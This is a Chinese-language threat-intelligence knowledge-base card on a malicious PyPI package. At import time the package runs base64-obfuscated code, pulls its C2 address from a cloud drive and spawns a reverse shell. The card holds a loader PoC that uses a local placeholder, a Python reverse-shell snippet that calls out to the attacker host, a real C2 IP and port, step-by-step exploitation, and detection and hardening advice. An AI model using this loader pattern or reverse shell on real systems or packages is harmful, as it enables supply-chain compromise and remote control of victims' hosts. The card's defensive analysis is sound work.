---
id: cloud-cicd-pypi-import-base64-reverse-shell-remote-c2
title: PyPI 恶意包导入即反弹 Shell：__init__.py 调 utils.run() 执行 Base64 载荷，C2 地址经云盘远程获取
type: scenario
domain: cloud
path: cloud/ci-cd
technique: pypi-import-time-base64-reverse-shell-remote-c2
tags:
- supply-chain
- pypi
- python
- reverse-shell
- base64
- google-drive
- import-time
- ci-cd
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
affected_versions: evilshielded 0.0.2、0.0.9（PyPI 恶意包版本）
verification:
  verified_by: verifier-V451
  verified_at: '2026-11-10T01:34:43+08:00'
  notes: 已对照原文与25/25图片核对：evilshielded 0.0.2/0.0.9、__init__.py 顶层 NetUtils.run()、subprocess.Popen python3 -c、两段Base64（云盘URL取回157.245.70.91:1338、反向Shell载荷占位串替换）、pty.spawn sh 均与图11/12一致；下载737次属实。dedup 候选均 related（multiplerequests 为 setup.py 安装期、本卡为导入期），非同链重复。版本为原文恶意包版本，保留。单一投毒链，颗粒度合适。无 sources/source_url。未验证点：PoC 为占位示意未执行；云盘与C2已失效未复测。
url: /docs/cloud/ci-cd/cloud-cicd-pypi-import-base64-reverse-shell-remote-c2/
draft: false
kb_aliases:
- evilshielded 投毒
- PyPI 导入即执行
- __init__.py 反向 shell
- base64 反弹 shell 供应链
- 云盘下发 C2 地址
---

## 一句话结论

PyPI 上的恶意包 `evilshielded` 在 `__init__.py` 顶层调用 `from .utils import NetUtils; NetUtils.run()`，用户 `import evilshielded`（或任何间接导入）时即通过 `subprocess.Popen(["python3","-c",...])` 执行 Base64 混淆的第二段代码；该代码先从云盘上的 Base64 编码地址取回“IP:端口”形式的远控配置，再把反向 Shell 载荷中的占位哈希替换为真实 IP，用 `pty.spawn("sh")` 把 Linux Shell 反弹给攻击者。

## 原理

- **包导入即执行**：Python 在 `import evilshielded` 时会执行包 `__init__.py` 的顶层语句。恶意包把触发器放在 `__init__.py` 的 `NetUtils.run()` 调用上，不依赖业务代码使用某个函数，安装后第一次导入（或依赖自动导入）就触发。
- **Base64 只是混淆层**：`utils.py` 中 `run()` 把一段 Python 代码 Base64 编码后塞进 `python3 -c` 字符串再由 `subprocess.Popen` 拉起；字符串中没有明文网络特征，静态扫描容易漏判。Base64 可逆，不影响执行；子进程方式还能与原包解释器环境解耦。
- **C2 地址远程配置**：第二段代码先 `requests.get(base64.b64decode(<内置 URL>).decode())`，从 Google Drive 下载页取回一段文本（原文为 `157.245.70.91:1338`），`split(':')[0]` 得到 IP。把 C2 放在合法云盘上，攻击者可随时更换受控服务器而不必重新发布包，也把外联伪装成正常云存储访问。
- **占位符替换再执行**：反向 Shell 载荷本身也以 Base64 保存，代码中预留一个长十六进制占位串（原文为 `34a04005...eb5c`），运行时用 `.replace(<占位串>, ip.encode())` 换成从云盘取回的真实 IP，再 `exec`。端口 1338 直接写死在载荷里。
- **载荷行为**：解码后的核心是常见 Python 反向 Shell——建立 socket、连接攻击者 IP:1338、把 0/1/2 三个文件描述符 `dup2` 到 socket、`pty.spawn("sh")` 获得交互式 Shell；在 Linux 上执行即把 bash/sh 控制权交给攻击者。
- **为什么有效**：包管理器安装的包默认被信任；导入是应用正常行为；云盘域名属于常见白名单流量；Base64 与远程配置把恶意特征从包内移到了运行时。

## 触发条件

- 受害者安装 `evilshielded`（或依赖树中引入该包），版本为 0.0.2/0.0.9；
- 运行环境为 Linux（载荷用 `pty.spawn("sh")`，Windows 下不会得到可用 Shell）；
- 应用或测试代码 `import evilshielded`，或框架自动发现/导入该包；
- 主机可出站访问 Google Drive 与攻击者 IP:1338。

## 利用步骤

1. 在 PyPI 发布伪装成普通工具库的包，`__init__.py` 顶层导入 `utils` 并调用 `NetUtils.run()`；
2. `utils.py` 用 Base64 保存两段内容：云盘配置地址、反向 Shell 载荷；`run()` 用 `subprocess.Popen(["python3","-c", <拼好的代码>])` 执行；
3. 子进程先请求云盘地址，取回 `IP:port`，拆分出 IP；
4. 解码反向 Shell 载荷，替换占位串为真实 IP，`exec` 执行；
5. 受害主机主动连接攻击者 IP:1338，攻击者获得交互式 Shell；
6. 更换 C2 时只改云盘上的配置文本，无需重新发版。

## PoC

包结构示意（占位内容，仅演示加载链，不联网）：

```python
# evilshielded/__init__.py
from .utils import NetUtils
NetUtils.run()
```

```python
# evilshielded/utils.py
import base64
import subprocess

class NetUtils:
    @staticmethod
    def run():
        # 第一段：从 Base64 编码的配置地址取回 "IP:port"
        url_b64 = base64.b64encode(b"http://127.0.0.1:8080/c2-config").decode()
        # 第二段：Base64 编码的载荷，内含占位哈希
        payload_b64 = base64.b64encode(
            b'print("replace-me-with-c2-ip")'
        ).decode()
        code = (
            "import base64,requests;"
            f"b=requests.get(base64.b64decode('{url_b64}').decode()).text.strip();"
            "ip=b.split(':')[0];"
            f"exec(base64.b64decode('{payload_b64}').decode()"
            ".replace('replace-me-with-c2-ip', ip))"
        )
        subprocess.Popen(["python3", "-c", code])
```

原样本载荷等价片段（仅说明行为）：

```python
import os, pty, socket
s = socket.socket()
s.connect(("<C2_IP>", 1338))
[os.dup2(s.fileno(), f) for f in (0, 1, 2)]
pty.spawn("sh")
```

验证：`pip install .` 后执行 `python -c "import evilshielded"` 即可观察子进程与外联；隔离环境使用本地伪造配置地址。

## 变体与关联

- 变体：触发点可放在 `__init__.py`、模块顶层、`setup.py`、PEP 517 构建后端或 `.pth` 文件，分别对应导入期、安装期与解释器启动期。
- 变体：C2 配置可放 Pastebin/rentry/GitHub raw/对象存储；也可直接硬编码。反向 Shell 可换成 Meterpreter、Sliver 或下载器。
- 关联：PyPI 安装期执行与两阶段窃密见 [[cloud-cicd-pypi-multiplerequests-setup-py-cstealer]]；PEP 517 构建后端执行见 [[cloud-cicd-pep517-build-backend-install-rce]]。
- 边界：`pip install --only-binary` 且不导入该包、或主机禁止出站时链不成立。

## 检测与防御

- 检测：site-packages 中包的 `__init__.py`/`utils.py` 含 `subprocess.Popen(["python3","-c",...])`、嵌套 Base64、`exec`、`.replace(<长十六进制串>, ...)` 组合。
- 检测：Python 进程异常连接 Google Drive 下载地址后又连向陌生 IP:高端口；`python3 -c` 子进程持有网络连接并 `pty.spawn`。
- 加固：依赖锁定哈希与私有源；安装前审查 sdist 源码；运行时限制 Python 进程出站；使用 EDR 监控 `python -c` 拉起 Shell 的行为。
- 响应：卸载包、杀死异常 python 子进程、封禁 C2、轮换主机凭据并排查横向。
